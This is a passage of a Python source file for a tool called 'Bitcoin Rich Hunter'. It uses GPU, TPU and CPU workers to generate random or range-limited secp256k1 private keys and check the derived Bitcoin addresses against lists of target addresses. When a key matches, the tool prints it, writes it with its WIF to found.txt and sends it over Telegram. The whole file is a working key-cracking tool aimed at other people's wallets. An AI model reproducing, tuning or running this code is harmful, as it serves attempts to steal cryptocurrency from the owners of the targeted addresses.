    N = SECP256K1_N
    rng_start, rng_end = key_range
    use_range = (rng_start is not None and rng_end is not None)
    rng_span  = (rng_end - rng_start) if use_range else None

    # ── Setup random generator ────────────────────────────────────────────────
    if backend == "cupy":
        try:
            import cupy as cp
            cp.cuda.Device(0).use()
            cp.array([1])
            def _gen(n):
                return bytes(cp.asnumpy(cp.random.bytes(n * 32)))
        except Exception as e:
            print(f"\n{Fore.RED}[GPU] CuPy init failed: {e} → falling back to CPU{Style.RESET_ALL}")
            _cpu_worker(0, counter, result_q, targets, stop_ev, 1000, key_range)
            return
    else:
        try:
            import torch
            if device == "xpu":
                import intel_extension_for_pytorch  # noqa
            dev_obj = torch.device(device)
            torch.randint(0, 256, (32,), dtype=torch.uint8, device=dev_obj).cpu()
            def _gen(n):
                t = torch.randint(0, 256, (n * 32,), dtype=torch.uint8, device=dev_obj)
                return bytes(t.cpu().numpy().tobytes())
        except Exception as e:
            print(f"\n{Fore.RED}[GPU] torch/{device} init failed: {e} → falling back to CPU{Style.RESET_ALL}")
            _cpu_worker(0, counter, result_q, targets, stop_ev, 1000, key_range)
            return

    print(f"  {Fore.GREEN}✅ GPU worker active [{backend}/{device}] batch={batch_sz}{Style.RESET_ALL}")

    # ── Double-buffer setup ───────────────────────────────────────────────────
    buf      = [None, None]
    gen_err  = [False]

    def _prefetch(idx):
        try:
            buf[idx] = _gen(batch_sz)
        except Exception as e:
            print(f"\n{Fore.RED}[GPU] Prefetch error: {e}{Style.RESET_ALL}")
            gen_err[0] = True

    _prefetch(0)
    _prefetch(1)
    cur = 0

    while not stop_ev.is_set():
        if gen_err[0]:
            _cpu_worker(0, counter, result_q, targets, stop_ev, 1000, key_range)
            return

        raw = buf[cur]
        if raw is None:
            time.sleep(0.01)
            continue

        # Start prefetch of next buffer in background
        nxt = 1 - cur
        prefetch_thread = threading.Thread(target=_prefetch, args=(nxt,), daemon=True)
        prefetch_thread.start()

        cnt = 0
        for i in range(batch_sz):
            if stop_ev.is_set():
                break
            chunk = raw[i * 32:(i + 1) * 32]
            if len(chunk) < 32:
                continue

            ki = int.from_bytes(chunk, "big")

            if use_range:
                # ── Rejection sampling — no modulo bias ──────────────────────
                span = rng_span
                if ki > span:
                    continue  # reject — try next
                ki    = rng_start + ki
                chunk = ki.to_bytes(32, "big")
                if not (0 < ki < N):
                    continue
            else:
                if not (0 < ki < N):
                    continue

            addrs = derive_addresses(chunk)
            m     = check_match(addrs, targets)
            if m:
                with counter.get_lock():
                    counter.value += cnt + 1
                result_q.put({
                    "privkey_hex":  chunk.hex(),
                    "addr_type":    m[0],
                    "addr":         m[1],
                    "wif":          addrs.get("wif", ""),
                    "all_addresses":addrs,
                })
                while not stop_ev.is_set():
                    time.sleep(0.05)
                prefetch_thread.join()
                return
            cnt += 1

        with counter.get_lock():
            counter.value += cnt
        prefetch_thread.join()
        cur = nxt


def _tpu_worker(counter, result_q, targets: frozenset, stop_ev,
                batch_sz: int, key_range: tuple):
    """JAX/TPU worker. Uses numpy array conversion (faster than .tolist())."""
    try:
        import jax, jax.numpy as jnp, jax.random as jr
        import numpy as np
        devs = jax.devices("tpu")
        if not devs:
            raise RuntimeError("No TPU devices found")
        print(f"  {Fore.GREEN}✅ TPU worker: {len(devs)} cores, batch={batch_sz}{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[TPU] Init failed: {e} → falling back to CPU{Style.RESET_ALL}")
        _cpu_worker(0, counter, result_q, targets, stop_ev, 1000, key_range)
        return

    rng_start, rng_end = key_range
    use_range = (rng_start is not None and rng_end is not None)
    rng_span  = (rng_end - rng_start) if use_range else None
    N = SECP256K1_N

    @jax.jit
    def _gen(k):
        k1, k2 = jr.split(k)
        return k1, jr.randint(k2, (batch_sz * 32,), 0, 256, dtype=jnp.uint8)

    rng = jr.PRNGKey(secrets.randbits(64))

    while not stop_ev.is_set():
        rng, raw_jax = _gen(rng)
        # Faster: numpy conversion instead of .tolist()
        raw = np.asarray(raw_jax).tobytes()

        cnt = 0
        for i in range(batch_sz):
            if stop_ev.is_set():
                break
            chunk = raw[i * 32:(i + 1) * 32]
            if len(chunk) < 32:
                continue
            ki = int.from_bytes(chunk, "big")

            if use_range:
                if ki > rng_span:
                    continue
                ki    = rng_start + ki
                chunk = ki.to_bytes(32, "big")
                if not (0 < ki < N):
                    continue
            else:
                if not (0 < ki < N):
                    continue

            addrs = derive_addresses(chunk)
            m     = check_match(addrs, targets)
            if m:
                with counter.get_lock():
                    counter.value += cnt + 1
                result_q.put({
                    "privkey_hex":  chunk.hex(),
                    "addr_type":    m[0],
                    "addr":         m[1],
                    "wif":          addrs.get("wif", ""),
                    "all_addresses":addrs,
                })
                while not stop_ev.is_set():
                    time.sleep(0.05)
                return
            cnt += 1

        with counter.get_lock():
            counter.value += cnt


# ==============================================================================
#  INDEPENDENT VERIFICATION
# ==============================================================================

def verify(privkey_hex: str, target_addr: str) -> dict:
    v = {
        "ok": False, "matched_type": None,
        "pub_comp": None, "pub_uncomp": None,
        "derived": {}, "notes": [],
    }
    try:
        kb = bytes.fromhex(privkey_hex)
        n  = int.from_bytes(kb, "big")
        if not (0 < n < SECP256K1_N):
            v["notes"].append("❌ Private key outside secp256k1 range!")
            return v

        addrs = derive_addresses(kb)
        if "_err" in addrs:
            v["notes"].append(f"❌ {addrs['_err']}"); return v

        if _CCKey and BASE58_OK:
            pk = _CCKey(kb)
            v["pub_comp"]  = pk.public_key.format(True).hex()
            v["pub_uncomp"]= pk.public_key.format(False).hex()
        elif BIP_UTILS_OK:
            priv = Secp256k1PrivateKey.FromBytes(kb)
            v["pub_comp"]  = priv.PublicKey().RawCompressed().ToBytes().hex()
            v["pub_uncomp"]= priv.PublicKey().RawUncompressed().ToBytes().hex()

        v["derived"] = {k: val for k, val in addrs.items() if k not in ("wif", "_err")}

        for at, av in addrs.items():
            if av and av == target_addr:
                v["ok"]           = True
                v["matched_type"] = at
                v["notes"].append(f"✅ VERIFIED  [{at.upper()}] → {av}")
                break
        if not v["ok"]:
            v["notes"].append("⚠  Re-derived addresses do NOT match — possible race condition!")
    except Exception as e:
        v["notes"].append(f"❌ Verification error: {e}")
    return v


# ==============================================================================
#  DISPLAY & SAVE
# ==============================================================================

ADDR_META = {
    "p2pkh":        ("Legacy P2PKH          [1...]   ", Fore.WHITE),
    "p2wpkh":       ("Native SegWit P2WPKH  [bc1q...]", Fore.BLUE),
    "p2tr":         ("Taproot P2TR          [bc1p...]", Fore.GREEN),
    "p2sh_p2wpkh":  ("Wrapped SegWit P2SH   [3...]   ", Fore.YELLOW),
    "p2pkh_uncomp": ("Legacy P2PKH Uncomp.  [1...]   ", Fore.WHITE),
}

def display_status(counter, t0: float, mode: str, num_workers: int,
                   stop_ev, key_range: tuple):
    last = 0
    rng_start, rng_end = key_range
    use_range = (rng_start is not None and rng_end is not None)
    rng_label = (f"Range:{Fore.MAGENTA}{(rng_end-rng_start).bit_length()}bit{Style.RESET_ALL} "
                 if use_range else f"Range:{Fore.GREEN}FULL{Style.RESET_ALL} ")

    while not stop_ev.is_set():
        time.sleep(1)
        now = time.time()
        tot = counter.value
        spd = tot - last
        last = tot
        avg  = tot / (now - t0) if (now - t0) > 0 else 0
        sys.stdout.write(
            f"\r[{Fore.CYAN}{mode}{Style.RESET_ALL}|W:{Fore.GREEN}{num_workers}{Style.RESET_ALL}] "
            f"{rng_label}"
            f"Checked:{Fore.YELLOW}{tot:,}{Style.RESET_ALL} "
            f"Speed:{Fore.GREEN}{spd:,}/s{Style.RESET_ALL} "
            f"Avg:{Fore.BLUE}{int(avg):,}/s{Style.RESET_ALL} "
            f"Time:{Fore.MAGENTA}{int(now-t0)}s{Style.RESET_ALL}    "
        )
        sys.stdout.flush()


def save_result(result: dict, verified: dict, found_file: str,
                accel_type: str, accel_name: str) -> None:
    """Write result to found.txt, flush, and close before returning."""
    pk   = result["privkey_hex"]
    wif  = result.get("wif", "N/A")
    addr = result["addr"]
    ts   = time.strftime("%Y-%m-%d %H:%M:%S")
    sep  = "=" * 72
    dsh  = "-" * 72

    derived = verified.get("derived", result.get("all_addresses", {}))

    lines = [
        "", sep,
        "  🎉  MATCH FOUND",
        f"  Time        : {ts}",
        f"  Accelerator : {accel_type} — {accel_name}",
        f"  Crypto lib  : {CRYPTO}",
        sep, "", dsh, "  VERIFICATION", dsh,
        f"  Status      : {'✅ VERIFIED' if verified['ok'] else '❌ FAIL'}",
        f"  Match Type  : {(verified.get('matched_type') or '').upper()}",
    ]
    for note in verified["notes"]:
        lines.append(f"  {note}")

    lines += [
        "", dsh, "  PRIVATE KEY", dsh,
        f"  HEX         : {pk}",
        f"  WIF         : {wif}",
        f"  PubKey (C)  : {verified.get('pub_comp', 'N/A')}",
        f"  PubKey (U)  : {verified.get('pub_uncomp', 'N/A')}",
        "", dsh, "  TARGET ADDRESS", dsh,
        f"  Type        : {result['addr_type'].upper()}",
        f"  Address     : {addr}",
        "", dsh, "  ALL ADDRESSES", dsh,
    ]
    for key, (label, _) in ADDR_META.items():
        val = derived.get(key)
        if val:
            mk = "  ◄◄◄ MATCH" if val == addr else ""
            lines.append(f"  {label}: {val}{mk}")
    lines += ["", sep, ""]

    with open(found_file, "a", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
        f.flush()
        os.fsync(f.fileno())   # guarantee disk write before Telegram send

    print(f"{Fore.GREEN}💾 Saved → {Fore.CYAN}{found_file}{Style.RESET_ALL}\n")


def display_and_save(result: dict, cfg: dict, found_file: str,
                     accel_type: str, accel_name: str):
    """Display result, save to file, then send Telegram — no prompts."""
    pk   = result["privkey_hex"]
    addr = result["addr"]

    print(f"\n\n{'='*72}")
    print(f"{Fore.GREEN}{'🎉  MATCH FOUND!':^72}{Style.RESET_ALL}")
    print(f"{'='*72}")

    print(f"\n{Fore.CYAN}⏳ Independent verification...{Style.RESET_ALL}")
    v  = verify(pk, addr)
    vs = (f"{Fore.GREEN}✅ VERIFIED{Style.RESET_ALL}" if v["ok"]
          else f"{Fore.RED}❌ FAIL{Style.RESET_ALL}")
    print(f"   Status    : {vs}")
    for note in v["notes"]:
        print(f"   {note}")

    wif     = result.get("wif", "N/A")
    derived = v.get("derived", result.get("all_addresses", {}))

    print(f"\n{'─'*72}")
    print(f"{Fore.YELLOW}  PRIVATE KEY{Style.RESET_ALL}")
    print(f"{'─'*72}")
    print(f"  {Fore.WHITE}HEX        :{Style.RESET_ALL} {Fore.RED}{pk}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}WIF        :{Style.RESET_ALL} {Fore.RED}{wif}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}PubKey (C) :{Style.RESET_ALL} {v.get('pub_comp','N/A')}")
    print(f"  {Fore.WHITE}PubKey (U) :{Style.RESET_ALL} {v.get('pub_uncomp','N/A')}")

    print(f"\n{'─'*72}")
    print(f"{Fore.YELLOW}  TARGET ADDRESS  [{result['addr_type'].upper()}]{Style.RESET_ALL}")
    print(f"{'─'*72}")
    lbl, col = ADDR_META.get(result["addr_type"], (result["addr_type"], Fore.WHITE))
    vmk = (f"{Fore.GREEN}[✅ VERIFIED]{Style.RESET_ALL}" if v["ok"]
           else f"{Fore.RED}[❓ UNVERIFIED]{Style.RESET_ALL}")
    print(f"  {col}{lbl}{Style.RESET_ALL}: {Fore.CYAN}{addr}{Style.RESET_ALL}  {vmk}")

    print(f"\n{'─'*72}")
    print(f"{Fore.YELLOW}  ALL ADDRESSES OF THIS KEY{Style.RESET_ALL}")
    print(f"{'─'*72}")
    for key, (label, color) in ADDR_META.items():
        val = derived.get(key)
        if val:
            mk = f"  {Fore.GREEN}◄ MATCH{Style.RESET_ALL}" if val == addr else ""
            print(f"  {color}{label}{Style.RESET_ALL}: {val}{mk}")
    print(f"\n{'='*72}\n")

    # ── Save first (file must be flushed before Telegram sends it) ──────────
    save_result(result, v, found_file, accel_type, accel_name)

    # ── Auto-send Telegram (no prompt) ───────────────────────────────────────
    tg_notify_all(cfg, result, v, found_file, accel_type, accel_name)


# ==============================================================================
#  BANNER & SETUP
# ==============================================================================

def print_banner(targets_count: int, target_files: list):
    _LABEL = {
        "GPU_NVIDIA": "NVIDIA CUDA", "GPU_AMD":   "AMD ROCm",
        "GPU_INTEL":  "Intel IPEX",  "GPU_APPLE": "Apple MPS",
        "TPU_JAX":    "Google TPU",  "CPU":       "CPU",
    }
    _COLOR = {
        "GPU_NVIDIA": Fore.GREEN,  "GPU_AMD":   Fore.RED,
        "GPU_INTEL":  Fore.BLUE,   "GPU_APPLE": Fore.WHITE,
        "TPU_JAX":    Fore.CYAN,   "CPU":       Fore.WHITE,
    }
    c  = _COLOR.get(ACCEL_TYPE, Fore.WHITE)
    l  = _LABEL.get(ACCEL_TYPE, ACCEL_TYPE)
    cc = Fore.GREEN if CRYPTO == "coincurve" else Fore.YELLOW
    cn = "(C-lib, fast)" if CRYPTO == "coincurve" else "(Python — install coincurve for speed!)"
    tf = "\n".join(f"     {Fore.CYAN}{f}{Style.RESET_ALL}" for f in target_files)

    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════╗
║    BITCOIN RICH HUNTER  ·  MAXIMUM PERFORMANCE EDITION  v2.0        ║
║  GPU Universal · TPU · CPU Multi-core · Telegram · .gz Support       ║
╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

  Accelerator  : {c}{ACCEL_NAME}  [{l}]{Style.RESET_ALL}
  Crypto lib   : {cc}{CRYPTO}  {cn}{Style.RESET_ALL}
  Address types: P2PKH · P2WPKH · P2TR (Taproot) · P2SH-P2WPKH · P2PKH-Uncomp

  Target files :
{tf}
  Total targets: {Fore.YELLOW}{targets_count:,} unique addresses{Style.RESET_ALL}
""")


def select_cores(cli_cores: int = None) -> int:
    total = multiprocessing.cpu_count()
    opts  = sorted(set(c for c in [1, 2, 4, 8, 16, total] if c <= total))
    if cli_cores:
        return min(max(1, cli_cores), total)
    print(f"\n{Fore.YELLOW}Select number of CPU cores:{Style.RESET_ALL}")
    for i, c in enumerate(opts, 1):
        tag = f"  {Fore.CYAN}← all cores{Style.RESET_ALL}" if c == total else ""
        print(f"  {Fore.CYAN}[{i}]{Style.RESET_ALL} {c} core(s){tag}")
    while True:
        try:
            idx = int(input(f"\n{Fore.WHITE}Choice (1-{len(opts)}): {Style.RESET_ALL}").strip()) - 1
            if 0 <= idx < len(opts):
                return opts[idx]
        except (ValueError, KeyboardInterrupt):
            pass
        print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")


def setup_telegram(cfg: dict) -> dict:
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║  SETUP TELEGRAM NOTIFICATIONS                            ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
  1. Open Telegram → @BotFather → /newbot → get TOKEN
  2. Send any message to your bot
  3. Open: https://api.telegram.org/bot<TOKEN>/getUpdates
     Find "chat":{{"id": NUMBER}} — that is your CHAT_ID
""")
    token   = input(f"{Fore.WHITE}BOT TOKEN  : {Style.RESET_ALL}").strip()
    chat_id = input(f"{Fore.WHITE}CHAT ID    : {Style.RESET_ALL}").strip()
    sf      = input(f"{Fore.WHITE}Send found.txt? (y/n) [y]: {Style.RESET_ALL}").strip().lower()
    cfg["telegram"].update({
        "enabled":   True,
        "bot_token": token,
        "chat_id":   chat_id,
        "send_file": (sf != "n"),
    })
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=4)
    print(f"{Fore.GREEN}✅ Saved to {CONFIG_FILE}{Style.RESET_ALL}")
    return cfg


# ==============================================================================
#  ARGUMENT PARSER  (for VPS / Colab non-interactive use)
# ==============================================================================

def parse_args():
    p = argparse.ArgumentParser(
        description="Bitcoin Rich Hunter — Maximum Performance Edition v2.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python bitcoin_hunter.py                          # interactive mode
  python bitcoin_hunter.py --cores 8               # 8 CPU cores
  python bitcoin_hunter.py --range 0x400...:0x7FF...  # specific hex range
  python bitcoin_hunter.py --range full             # full secp256k1 range
  python bitcoin_hunter.py --cores 4 --no-telegram  # no Telegram
  python bitcoin_hunter.py btc.txt --cores all      # custom target file
        """
    )
    p.add_argument("targets", nargs="*",
                   help="Target file(s) — overrides config.json targets")
    p.add_argument("--cores", type=str, default=None,
                   help="Number of CPU cores (integer or 'all')")
    p.add_argument("--range", type=str, default=None, dest="key_range",
                   help="Key range as START_HEX:END_HEX or 'full'")
    p.add_argument("--no-telegram", action="store_true",
                   help="Disable Telegram notifications for this run")
    p.add_argument("--no-gpu", action="store_true",
                   help="Force CPU-only mode (skip GPU detection)")
    p.add_argument("--extra-cpu", type=int, default=0,
                   help="Add N extra CPU workers alongside GPU/TPU")
    return p.parse_args()


# ==============================================================================
#  MAIN
# ==============================================================================

def main():
    if not (BIP_UTILS_OK or CRYPTO == "coincurve"):
        print(f"{Fore.RED}❌ No cryptographic library found!\n"
              f"   Run: pip install coincurve bip_utils base58{Style.RESET_ALL}")
        sys.exit(1)

    if CRYPTO == "bip_utils":
        print(f"{Fore.YELLOW}⚠  coincurve not installed — performance degraded.\n"
              f"   Install: pip install coincurve base58{Style.RESET_ALL}")

    args = parse_args()
    cfg  = load_config()

    # ── CLI disables Telegram ─────────────────────────────────────────────────
    if args.no_telegram:
        cfg["telegram"]["enabled"] = False

    # ── Telegram setup (interactive only if no CLI override) ─────────────────
    tg = cfg["telegram"]
    if not args.no_telegram:
        if not tg["enabled"]:
            try:
                ans = input(f"\n{Fore.CYAN}Enable Telegram notifications? (y/n): {Style.RESET_ALL}").strip().lower()
                if ans == "y":
                    cfg = setup_telegram(cfg)
            except EOFError:
                pass  # non-interactive (VPS/Colab) — skip
        elif tg.get("bot_token", "").startswith("Your_"):
            try:
                ans = input(f"{Fore.CYAN}Telegram is enabled but not configured. Setup now? (y/n): {Style.RESET_ALL}").strip().lower()
                if ans == "y":
                    cfg = setup_telegram(cfg)
            except EOFError:
                pass

    # ── Accelerator detection ─────────────────────────────────────────────────
    if args.no_gpu:
        print(f"\n{Fore.YELLOW}--no-gpu flag set, using CPU only{Style.RESET_ALL}")
    else:
        detect_accel()

    # ── Load targets ──────────────────────────────────────────────────────────
    target_files_cfg = args.targets if args.targets else cfg.get("targets", ["btc.txt"])
    all_targets  = set()
    loaded_files = []
    for tf in target_files_cfg:
        t = load_targets(tf)
        if t:
            all_targets.update(t)
            loaded_files.append(tf)

    if not all_targets:
        print(f"{Fore.RED}❌ No target addresses loaded. Exiting.{Style.RESET_ALL}")
        sys.exit(1)

    targets    = frozenset(all_targets)
    found_file = cfg.get("found_file", FOUND_FILE)

    # ── Banner ────────────────────────────────────────────────────────────────
    print_banner(len(targets), loaded_files)

    # ── Worker count ──────────────────────────────────────────────────────────
    cpu_only    = (ACCEL_TYPE == "CPU" or args.no_gpu)
    num_workers = 1
    mode_str    = ACCEL_TYPE
    extra_cpu   = args.extra_cpu

    # Parse --cores
    cli_cores = None
    if args.cores:
        if args.cores.lower() == "all":
            cli_cores = multiprocessing.cpu_count()
        else:
            try:
                cli_cores = int(args.cores)
            except ValueError:
                print(f"{Fore.RED}Invalid --cores value: {args.cores}{Style.RESET_ALL}")
                sys.exit(1)

    if cpu_only:
        num_workers = select_cores(cli_cores)
        mode_str    = f"CPU×{num_workers}"
        print(f"\n{Fore.GREEN}✅ Using {num_workers} CPU core(s){Style.RESET_ALL}\n")
    else:
        print(f"{Fore.GREEN}🚀 Accelerator: {ACCEL_TYPE} — {ACCEL_NAME}{Style.RESET_ALL}")
        if extra_cpu == 0 and cli_cores is None:
            try:
                ans = input(f"{Fore.CYAN}Add extra CPU workers in hybrid mode? (y/n): {Style.RESET_ALL}").strip().lower()
                if ans == "y":
                    extra_cpu = select_cores(cli_cores)
            except EOFError:
                pass
        elif cli_cores:
            extra_cpu = cli_cores

        num_workers = extra_cpu
        mode_str    = f"{ACCEL_TYPE}" + (f"+CPU×{extra_cpu}" if extra_cpu else "")
        print()

    # ── Key range ─────────────────────────────────────────────────────────────
    key_range  = select_key_range(args.key_range)
    rng_start, rng_end = key_range
    if rng_start is not None:
        span_bits = (rng_end - rng_start).bit_length()
        print(f"\n  {Fore.CYAN}🔑 Key Range active — span {span_bits}-bit{Style.RESET_ALL}")
        print(f"     Start : {Fore.YELLOW}{hex(rng_start)}{Style.RESET_ALL}")
        print(f"     End   : {Fore.YELLOW}{hex(rng_end)}{Style.RESET_ALL}")
    else:
        print(f"\n  {Fore.CYAN}🔑 Key Range: Full secp256k1 (random){Style.RESET_ALL}")
    print()

    # ── Telegram connection test ──────────────────────────────────────────────
    if not args.no_telegram and tg.get("enabled") and not tg.get("bot_token","").startswith("Your_"):
        print(f"{Fore.CYAN}📡 Testing Telegram connection...{Style.RESET_ALL}")
        tg_test(cfg)

    print(f"\n{Fore.WHITE}Starting search... Press Ctrl+C to stop{Style.RESET_ALL}\n")
    time.sleep(0.5)

    counter  = Value(ctypes.c_uint64, 0)
    found_q  = Queue()
    stop_ev  = multiprocessing.Event()
    procs    = []
    t0       = time.time()
    gpu_batch = cfg.get("gpu_batch", 8192)
    cpu_batch = cfg.get("cpu_batch", 1000)

    def start_workers():
        ps = []
        # GPU / TPU worker
        if not cpu_only and not args.no_gpu:
            if ACCEL_TYPE == "TPU_JAX":
                p = Process(target=_tpu_worker,
                            args=(counter, found_q, targets, stop_ev, gpu_batch, key_range))
                p.start(); ps.append(p)
            elif ACCEL_TYPE in ("GPU_NVIDIA", "GPU_AMD", "GPU_INTEL", "GPU_APPLE"):
                bk, dev = ACCEL_BACKEND
                p = Process(target=_gpu_worker,
                            args=(counter, found_q, targets, stop_ev, bk, dev, gpu_batch, key_range))
                p.start(); ps.append(p)

        # CPU workers
        for i in range(num_workers if cpu_only else num_workers):
            if cpu_only or num_workers > 0:
                p = Process(target=_cpu_worker,
                            args=(i, counter, found_q, targets, stop_ev, cpu_batch, key_range))
                p.start(); ps.append(p)

        return ps

    def launch_status(n_procs):
        threading.Thread(
            target=display_status,
            args=(counter, t0, mode_str, n_procs, stop_ev, key_range),
            daemon=True
        ).start()

    try:
        procs = start_workers()
        launch_status(len(procs))

        while True:
            if not found_q.empty():
                res = found_q.get()
                stop_ev.set()

                # Stop all workers first so output is clean
                for p in procs:
                    p.join(timeout=2)

                # Display, save, notify (all automatic — no prompts)
                display_and_save(res, cfg, found_file, ACCEL_TYPE, ACCEL_NAME)

                # Ask if user wants to continue
                try:
                    ans = input(f"\n{Fore.CYAN}Continue searching? (y/n): {Style.RESET_ALL}").strip().lower()
                except EOFError:
                    ans = "n"

                if ans == "y":
                    procs.clear()
                    stop_ev.clear()
                    counter.value = 0
                    t0 = time.time()
                    procs = start_workers()
                    launch_status(len(procs))
                else:
                    break

            time.sleep(0.1)

    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⏹  Stopped by user.{Style.RESET_ALL}")
    finally:
        stop_ev.set()
        for p in procs:
            p.terminate()
            p.join(timeout=2)

        elapsed = time.time() - t0
        tot     = counter.value
        avg     = tot / elapsed if elapsed > 0 else 0

        print(f"\n{Fore.CYAN}{'─'*50}")
        print(f"📊 Final Statistics")
        print(f"{'─'*50}{Style.RESET_ALL}")
        print(f"   Accelerator   : {Fore.CYAN}{ACCEL_TYPE} — {ACCEL_NAME}{Style.RESET_ALL}")
        print(f"   Crypto lib    : {Fore.GREEN if CRYPTO=='coincurve' else Fore.YELLOW}{CRYPTO}{Style.RESET_ALL}")
        print(f"   Total checked : {Fore.YELLOW}{tot:,}{Style.RESET_ALL}")
        print(f"   Elapsed time  : {Fore.BLUE}{elapsed:.1f}s{Style.RESET_ALL}")
        print(f"   Average speed : {Fore.GREEN}{int(avg):,} keys/s{Style.RESET_ALL}")
        print(f"\n{Fore.WHITE}Done.{Style.RESET_ALL}")


if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
